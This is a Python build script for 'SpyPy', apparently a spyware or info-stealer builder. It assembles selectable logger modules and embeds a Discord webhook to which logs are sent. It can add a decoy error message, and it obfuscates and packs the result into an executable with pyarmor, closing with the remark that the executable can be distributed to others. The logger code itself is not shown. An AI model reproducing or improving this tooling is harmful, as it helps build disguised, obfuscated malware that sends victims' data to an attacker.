# TODO: Ask for desired platform (Windows, Linux, MacOS)
# TODO: read line 58 in main.py and make the necessary changes
# TODO: Detect pyarmor error if an error occurs while packing the source
# TODO: Cleanup the code and make it more readable
import os
import re
import requests
import subprocess
import shutil

loggers = [
    file
    for file in os.listdir("src/loggers")
    if file.endswith(".py") and not file.startswith("__")
]

for logger in loggers:
    choice = (
        input(
            "[SPY-PY BUILDER] Would you like to include the functionality of the "
            + logger[:-3]
            + " logger? (yes/no) "
        )
        .strip()
        .lower()
    )
    if choice == "no":
        loggers.remove(logger)


def assemble_source():
    if not os.path.exists("spy-py-temp"):
        os.mkdir("spy-py-temp")

    imports = set()
    utils_content = ""
    loggers_content = ""
    main_content = ""

    try:
        with open("src/utils.py", "r", encoding="utf-8") as f:
            utils_lines = f.readlines()
            for line in utils_lines:
                if re.match(r"^\s*import\s", line) or re.match(
                    r"^\s*from\s.*\simport\s", line
                ):
                    imports.add(line.strip())
                else:
                    utils_content += line
    except UnicodeDecodeError as e:
        print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in 'src/utils.py': {e}")
        return

    for root, _, files in os.walk("src/loggers"):
        for file in files:
            if file in loggers:
                try:
                    with open(os.path.join(root, file), "r", encoding="utf-8") as f:
                        logger_lines = f.readlines()
                        for line in logger_lines:
                            if re.match(r"^\s*import\s", line) or re.match(
                                r"^\s*from\s.*\simport\s", line
                            ):
                                if not line.startswith("from utils"):
                                    imports.add(line.strip())
                            else:
                                loggers_content += line
                except UnicodeDecodeError as e:
                    print(
                        f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in '{os.path.join(root, file)}': {e}"
                    )
                    continue

    try:
        with open("src/main.py", "r", encoding="utf-8") as f:
            main_lines = f.readlines()
            for line in main_lines:
                if re.match(r"^\s*import\s", line) or re.match(
                    r"^\s*from\s.*\simport\s", line
                ):
                    if not line.startswith("from loggers") and not line.startswith(
                        "from utils"
                    ):
                        imports.add(line.strip())
                else:
                    main_content += line
    except UnicodeDecodeError as e:
        print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in 'src/main.py': {e}")
        return

    try:
        with open("spy-py-temp/assembled.py", "w", encoding="utf-8") as f:
            for imp in sorted(imports):
                f.write(imp + "\n")
            f.write("\n")
            f.write(utils_content)
            f.write("\n")
            f.write(loggers_content)
            f.write("\n")
            f.write(main_content)
    except UnicodeEncodeError as e:
        print(
            f"[SPY-PY BUILDER] [INFO] UnicodeEncodeError when writing to 'spy-py-temp/assembled.py': {e}"
        )
        return

    print("[SPY-PY BUILDER] [INFO] Assembly completed successfully.")

try:
    assemble_source()  # now there is spy-py-temp/assembled.py
except Exception as e:
    print(f"[SPY-PY BUILDER] [ERROR] An error while assembling the source: {e}")
    print(
        f"[SPY-PY BUILDER] [ERROR] An error occured during the build process. Please try again or open an issue on the GitHub repository."
    )

def prepare_source():
    webhook_url = input(
        "[SPY-PY BUILDER] Enter the URL of the Discord webhook: "
    ).strip()
    while True:
        data = {
            "content": "```SpyPy has been configured to send logs to this webhook.```",
            "username": "SpyPy",
        }
        response = requests.post(webhook_url, json=data)
        if response.status_code not in [200, 204]:
            print(
                "[SPY-PY BUILDER] [ERROR] Failed to send test message to webhook. Please enter a valid URL."
            )
            webhook_url = input(
                "[SPY-PY BUILDER] Enter the URL of the Discord webhook: "
            ).strip()
        else:
            break

    exe_name = input(
        "[SPY-PY BUILDER] Enter the desired name of the executable: "
    ).strip()
    software_dir_name = input(
        f"Specify the name of the directory where the software will be stored (DEFAULT: {exe_name}): "
    ).strip()
    choice = (
        input(
            "[SPY-PY BUILDER] Would you like to display a custom error message? (yes/no) "
        )
        .strip()
        .lower()
    )
    custom_error_message = ""
    if choice == "yes":
        custom_error_message = input(
            "[SPY-PY BUILDER] Enter the custom error message: "
        ).strip()
    
    try:
        with open("spy-py-temp/assembled.py", "r", encoding="utf-8") as f:
            content = f.readlines()

        modified_content = []
        for line in content:
            if line.startswith("WEBHOOK_URL = "):
                modified_content.append(f'WEBHOOK_URL = "{webhook_url}"\n')
            elif line.startswith("SOFTWARE_EXE_NAME = "):
                modified_content.append(f'SOFTWARE_EXE_NAME = "{exe_name}"\n')
            elif line.startswith("SOFTWARE_DIR_NAME = "):
                if software_dir_name:
                    modified_content.append(f'SOFTWARE_DIR_NAME = "{software_dir_name}"\n')
                else:
                    modified_content.append(f'SOFTWARE_DIR_NAME = "{exe_name}"\n')
            elif line.startswith("CUSTOM_ERROR_MESSAGE = "):
                if custom_error_message:
                    modified_content.append(f'CUSTOM_ERROR_MESSAGE = "{custom_error_message}"\n')
                else:
                    modified_content.append("CUSTOM_ERROR_MESSAGE = None\n")
            else:
                modified_content.append(line)

        with open("spy-py-temp/prepared.py", "w", encoding="utf-8") as f:
            f.writelines(modified_content)

        os.remove("spy-py-temp/assembled.py")
        print("[SPY-PY BUILDER] [INFO] Source preparation completed successfully.")

    except Exception as e:
        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while preparing the source: {e}")
        print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")

try:
    prepare_source()  # now there is spy-py-temp/prepared.py
except Exception as e:
    print(f"[SPY-PY BUILDER] [ERROR] An error while preparing the source: {e}")
    print(
        f"[SPY-PY BUILDER] [ERROR] An error occured during the build process. Please try again or open an issue on the GitHub repository."
    )

def pack_source():
    try:
        subprocess.run("pyarmor -h", shell=True)
    except Exception as e:
        print(
            "[SPY-PY BUILDER] [ERROR] Failed to run 'pyarmor'. Make sure it is installed."
        )
        print(
            "[SPY-PY BUILDER] [INFO] You can install 'pyarmor' by running 'pip install pyarmor'."
        )
        return

    obfuscate_command = "pyarmor gen --pack onefile spy-py-temp/prepared.py"
    try:
        subprocess.run(obfuscate_command, shell=True)
    except Exception as e:
        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while obfuscating the source: {e}")
        print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
        return
    print("[SPY-PY BUILDER] [INFO] Source obfuscation completed successfully.")

try:
    pack_source()  # now the source is packed into an executable and obfuscated
except Exception as e:
    print(f"[SPY-PY BUILDER] [ERROR] An error while obfuscating the source: {e}")
    print(
        f"[SPY-PY BUILDER] [ERROR] An error occured during the build process. Please try again or open an issue on the GitHub repository."
    )

def cleanup():
    try:
        shutil.rmtree("spy-py-temp")
        if os.path.exists("prepared.spec"):
            os.remove("prepared.spec")
        if os.path.exists(".pyarmor"):
            shutil.rmtree(".pyarmor")
    except Exception as e:
        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while cleaning up: {e}")
        print("[SPY-PY BUILDER] [ERROR] Please manually remove the 'spy-py-temp' directory.")
    print("SPY-PY BUILDER] [INFO] Cleanup completed successfully.")

def finish():
    print(
        "[SPY-PY BUILDER] [INFO] The build process has been completed successfully. The executable is located in the 'dist' directory."
    )
    print(
        "[SPY-PY BUILDER] [INFO] You can now run the executable or distribute it to others."
    )
    print("[SPY-PY BUILDER] [INFO] Thank you for using SpyPy.")